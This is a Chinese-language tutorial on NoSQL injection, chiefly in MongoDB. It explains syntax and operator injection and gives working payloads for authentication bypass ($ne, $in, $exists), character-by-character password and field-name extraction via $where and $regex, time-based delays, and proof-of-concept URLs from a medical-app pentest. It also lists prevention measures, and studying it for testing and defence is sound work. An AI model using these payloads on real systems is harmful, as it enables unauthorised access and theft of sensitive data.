# NoSQL 注入

NoSQL 注入是一种漏洞，攻击者能够干扰应用程序向 NoSQL 数据库发出的查询。NoSQL 注入可能使攻击者能够：

- 绕过身份验证或保护机制。
- 提取或编辑数据。
- 造成拒绝服务。
- 在服务器上执行代码。

NoSQL 数据库以不同于传统 SQL 关系表的形式存储和检索数据。它们使用广泛的查询语言，而不是像 SQL 那样的通用标准，并且具有较少的关系约束。

如果使用字符串连接构建查询，攻击者就可以尝试破坏数据并更改查询的语法。例如：使用 JS 字符串动态拼接构建的函数字符串语句，此时注入位置在 JS 代码内

## NoSQL 数据库

NoSQL 数据库以不同于传统 SQL 关系表的形式存储和检索数据，NoSQL 数据存储区呈现使用键/值映射的数据。键和值可以任意定义，而且值的格式通常与数据存储区无关。键/值存储的另一个特点在于，值可能为数据结构本身，因而可以实现层次化存储。它们旨在处理大量非结构化或半结构化数据。

与 SQL 数据库一样，用户通过应用程序传递给数据库的查询与 NoSQL 数据库中的数据进行交互。然而，不同的 NoSQL 数据库使用广泛的查询语言，而不是像 SQL（结构化查询语言）这样的通用标准。这可能是自定义查询语言或像 XML、JSON 这样的通用语言。

### NoSQL 数据库模型

NoSQL 数据库种类繁多。为了检测 NoSQL 数据库中的漏洞，了解其模型框架和语言会有所帮助。

一些常见的 NoSQL 数据库类型包括：

- **文档存储（Document stores）** —— 以灵活、半结构化文档的形式存储数据。通常使用 JSON、BSON 和 XML 等格式，并通过 API 或查询语言进行查询。示例包括 MongoDB 和 Couchbase。

- **键值存储（Key-value stores）** —— 以键值格式存储数据。每个数据字段与一个唯一的键字符串关联。值根据唯一键进行检索。示例包括 Redis 和 Amazon DynamoDB。

- **宽列存储（Wide-column stores）** —— 将相关数据组织成灵活的列族，而不是传统的行。示例包括 Apache Cassandra 和 Apache HBase。

- **图数据库（Graph databases）** —— 使用节点存储数据实体，使用边存储实体之间的关系。示例包括 Neo4j 和 Amazon Neptune。

## NoSQL 注入的类型

NoSQL 注入有两种不同类型：

- **语法注入** —— 当破坏 NoSQL 查询语法，从而注入自己的载荷时发生。其方法论类似于 SQL 注入中使用的方法。然而，攻击的性质差异很大，因为 NoSQL 数据库使用一系列查询语言、查询语法类型和不同的数据结构。
- **操作符注入** —— 当使用 NoSQL 查询操作符来操纵查询时发生。

在本主题中，我们将介绍如何总体上测试 NoSQL 漏洞，然后重点关注如何利用 MongoDB（最流行的 NoSQL 数据库）中的漏洞。

## NoSQL 语法注入

通过尝试破坏查询语法来检测 NoSQL 注入漏洞。为此，系统性地测试每个输入，提交模糊测试字符串和特殊字符，如果应用程序没有充分清理或过滤它们，这些字符会触发数据库错误或其他可检测的行为。

如果你知道目标数据库的 API 语言，请使用与该语言相关的特殊字符和模糊测试字符串。否则，使用各种模糊测试字符串来针对多种 API 语言。

### 检测 MongoDB 中的语法注入

考虑一个按不同类别显示产品的购物应用程序。当用户选择 **Fizzy drinks** 类别时，他们的浏览器请求以下 URL：

```
category=fizzy
```

这导致应用程序发送一个 JSON 查询，从 MongoDB 数据库的 `product` 集合中检索相关产品：

```MongoDB
this.category == 'fizzy'
```

要测试输入是否可能存在漏洞，在 `category` 参数的值中提交一个模糊测试字符串。MongoDB 的示例字符串是：

```
'"`{
;$Foo}
$Foo \xYZ
```

使用此模糊测试字符串构造以下攻击：

```
category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

如果这导致与原始响应发生变化，可能表明用户输入未被正确过滤或清理。

> **注意：** NoSQL 注入漏洞可能发生在各种上下文中，你需要相应地调整模糊测试字符串。否则，你可能只是触发了验证错误，导致应用程序从不执行你的查询。
>
> 在此示例中，我们通过 URL 注入模糊测试字符串，因此该字符串经过 URL 编码。在某些应用程序中，你可能需要通过 JSON 属性注入载荷。在这种情况下，此载荷将变为 ```'\"`{\r;$Foo}\n$Foo \\xYZ\u0000```（转义`"` `\`）。

#### 确定哪些字符被处理

要确定哪些字符被应用程序解释为语法，注入单个字符。例如，提交 `'`，这导致以下 MongoDB 查询：

```
this.category == '''
```

如果这导致与原始响应发生变化，可能表明 `'` 字符破坏了查询语法并导致了语法错误。通过在输入中提交有效的查询字符串来确认这一点，例如通过转义引号：

```
this.category == '\''
```

如果这没有导致语法错误，可能意味着应用程序容易受到注入攻击。

有时反斜杠被禁用，于是上述方法无法使用。尝试字符串拼接运算

```
this.category == 有效字符串'+'
```

若查找内容与“有效字符串”的内容相同，而不是将所有输入字符作为字符串，则此处进行了运算。也可尝试将有效字符串分为两部分

#### 确认条件行为

检测到漏洞后，下一步是确定你是否可以使用 NoSQL 语法影响布尔条件。

为此，发送两个请求，一个带有假条件，一个带有真条件。例如，在有效字符串后附件条件语句 `有效字符串' && 0 && 'x` 和 `有效字符串' && 1 && 'x`，如下所示：

```
category=fizzy'+%26%26+0+%26%26+'x
```

```
category=fizzy'+%26%26+1+%26%26+'x
```

如果应用程序的行为不同，这表明假条件影响查询逻辑，而真条件不影响。这表明注入这种风格的语法会影响服务器端查询。

#### 覆盖现有条件

既然你已经确定可以影响布尔条件，尝试覆盖现有条件以利用漏洞。例如，注入一个始终评估为真的 JavaScript 条件，如 `'||'1'=='1`：

```
category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

这导致以下 MongoDB 查询：

```MongoDB
this.category == 'fizzy'||'1'=='1'
```

由于注入的条件始终为真，修改后的查询返回所有项目。这使你能够查看任何类别中的所有产品，包括隐藏或未知的类别。

> **警告：** 在向 NoSQL 查询注入始终评估为真的条件时要小心。尽管在你注入的初始上下文中这可能无害，但应用程序通常会在多个不同的查询中使用来自单个请求的数据。例如，如果应用程序在更新或删除数据时使用它，这可能导致意外的数据丢失。

##### 使 MongoDB 查询的原始后缀条件被忽略

例如，查询可能有一个额外的 `this.released` 限制：

```MongoDB
this.category == 'fizzy' && this.released == 1
```

限制 `this.released == 1` 用于仅显示已发布的产品。对于未发布的产品，大概是 `this.released == 0`。

**使用逻辑表达式 `'||1||'`** 第二个“或”`||`使得之后的“与”`&&`不被评估，`前半真条件 || '' && 原查询后缀`

攻击者可以如下构造攻击：

```
category=fizzy'||1||'
```

这导致以下 NoSQL 查询：

```MongoDB
this.category == 'fizzy'||1||'' && this.released == 1
```

**尝试在载荷后添加一个空字符** MongoDB 可能忽略空字符后的所有字符。

攻击者可以如下构造攻击：

```
category=fizzy'%00
```

这导致以下 NoSQL 查询：

```MongoDB
this.category == 'fizzy'\u0000' && this.released == 1
```

如果 MongoDB 忽略空字符后的所有字符，这移除了对 `released` 字段必须设置为 1 的要求。结果，`fizzy` 类别中的所有产品都被显示，包括未发布的产品。

## NoSQL 操作符注入

NoSQL 数据库通常使用查询操作符，这些操作符提供了指定数据必须满足的条件以包含在查询结果中的方法。

MongoDB 查询操作符的示例包括：

- `$gt`    大于                                 
- `$lt`    小于                                 
- `$eq`    等于                                 
- `$ne`    匹配不等于                               
- `$regex` 匹配正则表达式                           
- `$in`    匹配数组中指定的所有值
- `$exists`确定特定字段的存在
- `$where` 匹配满足 JavaScript 表达式                  

你可能能够注入查询操作符来操纵 NoSQL 查询。为此，系统性地将不同的操作符提交到一系列用户输入中，然后检查响应中是否有错误消息或其他变化。

### 提交查询操作符

在 JSON 消息中，将查询操作符作为嵌套对象插入。例如，`{"username":"wiener"}` 变为 `{"username":{"$ne":"invalid"}}`。

对于基于 URL 的输入，通过 URL 参数插入查询操作符。例如，`username=wiener` 变为 `username[$ne]=invalid`。如果这不起作用，尝试以下方法：

1. 将请求方法从 `GET` 转换为 `POST`。
2. 将 `Content-Type` 头更改为 `application/json`。
3. 将 JSON 添加到消息体中。
4. 在 JSON 中注入查询操作符。

> **注意：** 使用 [Content Type Converter](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278) 扩展自动转换请求方法并将 URL 编码的 `POST` 请求更改为 JSON。

### 检测 MongoDB 中的操作符注入

考虑一个易受攻击的应用程序，它在 `POST` 请求的消息体中接受用户名和密码：

```json
{"username":"wiener","password":"peter"}
```

使用一系列操作符测试每个输入。例如，要测试 username 输入是否处理查询操作符，尝试以下注入：

```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

如果应用了 `$ne` 操作符，这将查询所有 username 不等于 `invalid` 的用户。

如果 username 和 password 输入都处理该操作符，则可能可以使用以下载荷绕过身份验证：

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

此查询返回所有 username 和 password 都不等于 `invalid` 的登录凭据。结果，你以集合中第一个用户的身份登录到应用程序。

要定位某个账户，构造一个包含已知用户名或你猜测的用户名的载荷。例如：

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

## 利用语法注入提取数据

在许多 NoSQL 数据库中，某些查询操作符或函数可以运行有限的 JavaScript 代码，例如 MongoDB 的 `$where` 操作符和 `mapReduce()` 函数。这意味着，如果易受攻击的应用程序使用这些操作符或函数，数据库可能会将 JavaScript 作为查询的一部分进行评估。因此，你可能能够使用 JavaScript 函数从数据库中提取数据。

### 在 MongoDB 中泄露数据

考虑一个易受攻击的应用程序，它允许用户查找其他已注册的用户名并显示其角色。这触发对 URL 的请求：

```
https://insecure-website.com/user/lookup?username=admin
```

这导致对 `users` 集合的以下 NoSQL 查询：

```json
{"$where":"this.username == 'admin'"}
```

由于查询使用 `$where` 操作符，尝试将 JavaScript 函数注入此查询，使其返回敏感数据。例如，发送以下载荷：

```
admin' && this.password[0] == 'a' || 'a'=='b
```

这将返回用户密码字符串的第一个字符，使你能够逐个字符地提取密码。

你也可以使用 JavaScript `match()` 函数来提取信息。例如，以下载荷使你能够识别密码是否包含数字：

```
admin' && this.password.match(/\d/) || 'a'=='b
```

识别长度
- `$where`
    ```json
    {"$where":"this.password.length == 7"}
    ```
- `$regex`
    ```json
    {"password":{"$regex":".{7}"}}
    ```

#### 识别字段名称

由于 MongoDB 处理不需要固定模式的半结构化数据，你可能需要在通过 JavaScript 注入提取数据之前识别集合中的有效字段。

例如，要识别 MongoDB 数据库是否包含 `password` 字段，提交以下载荷：

```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

即

```MongoDB
username='admin' && this.password!=''
```

再次为现有字段和不存在的字段发送载荷。在此示例中，你知道 `username` 字段存在，因此发送以下载荷：

```
admin' && this.username!='
```

```
admin' && this.foo!='
```

如果 `password` 字段存在，你期望响应与现有字段（`username`）的响应相同，但与不存在的字段（`foo`）的响应不同。

如果你想测试不同的字段名称，通过使用字典来循环不同的潜在字段名称来执行字典攻击。

> **注意：** 你也可以使用 NoSQL 操作符注入逐个字符地提取字段名称。这使你无需猜测或执行字典攻击即可识别字段名称。我们将在下一节教你如何做到这一点。

> **注意** NoSQL 的字段不拥有模式，特定功能将触发动态字段添加。若未发现有趣字段，在执行特定操作或积累状态后再次测试。

## 利用 NoSQL 操作符注入提取数据

即使原始查询没有使用任何允许你运行任意 JavaScript 的操作符，你也可能能够自己注入这些操作符之一。然后使用布尔条件来确定应用程序是否执行你通过此操作符注入的任何 JavaScript。

### 在 MongoDB 中注入操作符

考虑一个易受攻击的应用程序，它在 `POST` 请求的消息体中接受用户名和密码：

```json
{"username":"wiener","password":"peter"}
```

要测试你是否可以注入操作符，尝试添加 `$where` 操作符作为额外参数，然后发送一个条件评估为假的请求，以及另一个评估为真的请求。例如：

```json
{"username":"wiener","password":"peter", "$where":"0"}
```

```json
{"username":"wiener","password":"peter", "$where":"1"}
```

如果响应之间存在差异，这可能表明 `$where` 子句中的 JavaScript 表达式正在被评估。

#### 提取字段名称

如果你已经注入了一个能够运行 JavaScript 的操作符，你可能能够使用 `keys()` 方法来提取数据字段的名称。例如，提交以下载荷：

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

这会检查用户对象中的第一个数据字段

- 若找到则返回字段名称的第一个字符
- 若未找到则返回 `null`

从而逐个字符地提取字段名称

- 正则表达式型，想象模型 `..x....` 前后设置通配符，移动当前爆破字符
    ```json
    {"$where":"Object.keys(this)[0].match('^.{§0§}§a§.*')"}
    ```
    - `{§0§}` 正则前缀通配数量，控制属性字符串索引
    - `§a§` 通配之后的当前爆破字符

- 传统型
    ```json
    {"$where": "Object.keys(this)[0][§0§] == '§x§'"}
    ```
    - `[§0§]` 属性字符串索引
    - `'§x§'` 当前爆破字符

同样使用 `length` 查看字段数量

```json
{"$where":"Object.keys(this).length == 5"}
```

#### 使用操作符泄露数据

或者，使用不启用 JavaScript 运行的操作符来提取数据。例如，你可能能够使用 `$regex` 操作符逐个字符地提取数据。

考虑一个易受攻击的应用程序，它在 `POST` 请求的消息体中接受用户名和密码。例如：

```json
{"username":"myuser","password":"mypass"}
```

首先测试 `$regex` 操作符是否被处理，如下所示：

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

如果对此请求的响应与你提交错误密码时收到的响应不同，这表明应用程序可能容易受到攻击。使用 `$regex` 操作符逐个字符地提取数据。例如，以下载荷检查密码是否以 `a` 开头：

```json
{"username":"admin","password":{"$regex":"^a.*"}}
```

## 基于时间的注入

有时触发数据库错误不会导致应用程序响应出现差异。在这种情况下，你仍然可以通过使用 JavaScript 注入触发条件时间延迟来检测和利用漏洞。

要进行基于时间的 NoSQL 注入：

1. 多次加载页面以确定基准加载时间。
2. 在输入中插入基于时间的载荷。基于时间的载荷在执行时会在响应中引起有意的延迟。例如，`{"$where": "sleep(5000)"}` 在成功注入时会引起 5000 毫秒的有意延迟。
3. 识别响应是否加载得更慢。这表明注入成功。

如果密码以字母 `a` 开头，以下基于时间的载荷将触发时间延迟：

```js
'admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+''
```
- 取当前时间，增加自定义时长，若字符匹配且未超过自定义时间长则持续循环

```js
'admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+''
```
- 若字符匹配则睡眠自定义时长


### PHP 变量覆盖同名 MongoDB 保留运算符

即使查询中使用的输入被完全清理或参数化，还有一种替代途径可能触发 NoSQL 注入。许多 NoSQL 实例有自己的保留变量名，独立于应用程序编程语言。

例如，在 MongoDB 中，`$where` 语法本身就是一个保留的查询运算符。它需要按原样传递到查询中；任何更改都会导致数据库错误。然而，由于 `$where` 也是有效的 PHP 变量名，攻击者可能通过创建一个名为 `$where` 的 PHP 变量将代码插入查询。PHP MongoDB 文档明确警告开发人员：

请确保对于所有特殊查询运算符（以 `$` 开头），您使用单引号，以便 PHP 不会尝试用变量 `$exists` 的值替换 `$exists`。

即使查询不依赖于任何用户输入，如以下示例，攻击者也可以通过将运算符替换为恶意数据来利用 MongoDB。

```MongoDB
db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );
```

一种潜在向 PHP 变量分配数据的方法是通过 HTTP 参数污染（参见：测试 HTTP 参数污染）。通过参数污染创建名为 `$where` 的变量，可以触发 MongoDB 错误，指示查询不再有效。任何不是字符串 `$where` 本身的 `$where` 值都足以证明漏洞。攻击者将通过插入以下内容开发完整的利用：

`$where: function() { //arbitrary JavaScript here }`

## 防止 NoSQL 注入

防止 NoSQL 注入攻击的适当方法取决于所使用的具体 NoSQL 技术。因此，我们建议阅读你选择的 NoSQL 数据库的安全文档。也就是说，以下宽泛的指导方针也会有所帮助：

- 清理和验证用户输入，使用允许字符的白名单。
- 使用参数化查询插入用户输入，而不是直接将用户输入拼接到查询中。
- 为防止操作符注入，应用允许键的白名单。

## NoSQL 注入真实示例

在对一个使用 MongoDB 进行数据库操作的医疗应用程序进行渗透测试期间，我们遇到了多个 NoSQL 注入实例。身份验证依赖于两个基本参数：

- **Patient ID**：此参数包含系统中每位患者的唯一 ID。
- **AuthKey**：AuthKey 用作身份验证的秘密令牌，保护敏感的患者数据。

在评估过程中，我们发现其中一个端点泄露了 `PatientID`。但是，要绕过身份验证，需要 `AuthKey`。这时我们使用了值为 `true` 的 `$exists` 运算符，它强制应用程序评估 `AuthKey` 字段的存在。换句话说，它使语句为真，从而绕过身份验证。

**绕过身份验证的 POC：**
```
www.vulnerableapp.com/api/v1/patients/getMedicalHistory?PatientID=11232241&AuthKey[$exists]=true
```

还有其他运算符，如 `$gt` 和 `$ne`，可用于查询以从数据库中返回特定记录。以下是应用程序其他功能中找到的 POC。

**检索医生详细信息的 POC**
`$gt` 运算符将检索 AuthToken 值大于 0 的记录。在大多数情况下，这将包括具有正数值 AuthToken 值的记录。
```
https://vulnerableapp.com/api/v1/doctor/getProfile?DoctorID=18141842&AuthKey[$gt]=0&UserType=doctor
```

**检索患者详细信息的 POC**
`$ne` 运算符将检索 `Auth_Key` 不等于 `0` 的记录；它将排除 Auth_Key 为 0 的记录，这可能表示无效或不活跃的账户。
```
https://vulnerableapp.com/api/v1/patients/getProfile?PatientID=123123213&AuthKey[$ne]=0
```

**提示：** 虽然前面描述的测试用例是针对基于布尔的注入，即你可以操纵查询以返回真或假条件，但测试其他类型的 MongoDB 注入漏洞也很重要。要测试潜在的 MongoDB 注入，请尝试在输入字段中使用特殊字符，如单引号（`'`）、双引号（`"`）、分号（`;`）、反斜杠（`\`）、括号（`()`）、方括号（`[]`）和花括号（`{}`）。
